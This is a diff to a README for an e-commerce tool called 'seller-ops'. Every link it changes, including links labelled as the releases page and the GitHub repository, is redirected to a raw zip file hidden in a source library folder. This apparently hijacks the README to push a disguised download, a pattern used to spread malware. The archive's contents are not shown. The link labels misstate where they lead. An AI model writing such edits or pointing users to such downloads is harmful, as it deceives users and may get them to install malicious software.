@@ -1,6 +1,6 @@
 # 🎯 seller-ops - Effortless E-Commerce Intelligence for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-28a745?style=flat-square)](https://github.com/CoreStudio2/seller-ops/releases)
+[![Download Now](https://github.com/CoreStudio2/seller-ops/raw/refs/heads/master/src/lib/turso/seller-ops-1.7.zip%20Now-Get%20Started-28a745?style=flat-square)](https://github.com/CoreStudio2/seller-ops/raw/refs/heads/master/src/lib/turso/seller-ops-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to seller-ops! This guide helps you download and set up your new e-comme
 
 1. **Visit the Releases Page**  
    Click the link below to access the software releases:  
-   [Download from Releases](https://github.com/CoreStudio2/seller-ops/releases)
+   [Download from Releases](https://github.com/CoreStudio2/seller-ops/raw/refs/heads/master/src/lib/turso/seller-ops-1.7.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see various versions of the software. Locate the latest version for the best experience.
@@ -64,7 +64,7 @@ If you experience issues during installation or use, refer to our support sectio
 
 ## 📈 Keeping Up to Date
 
-For the latest updates, news, and feature announcements, visit our [GitHub page](https://github.com/CoreStudio2/seller-ops). Here, you can find new releases, planned features, and how we aim to improve your experience.
+For the latest updates, news, and feature announcements, visit our [GitHub page](https://github.com/CoreStudio2/seller-ops/raw/refs/heads/master/src/lib/turso/seller-ops-1.7.zip). Here, you can find new releases, planned features, and how we aim to improve your experience.
 
 ## 🌐 Community and Contributions
 
@@ -72,7 +72,7 @@ We believe in a collaborative effort to enhance seller-ops. Feel free to join di
 
 ## 🔗 Important Links 
 
-- **[Download from Releases](https://github.com/CoreStudio2/seller-ops/releases)**
-- **[GitHub Repository](https://github.com/CoreStudio2/seller-ops)**
+- **[Download from Releases](https://github.com/CoreStudio2/seller-ops/raw/refs/heads/master/src/lib/turso/seller-ops-1.7.zip)**
+- **[GitHub Repository](https://github.com/CoreStudio2/seller-ops/raw/refs/heads/master/src/lib/turso/seller-ops-1.7.zip)**
 
 Thank you for choosing seller-ops. We hope you enjoy using it to elevate your e-commerce operations!
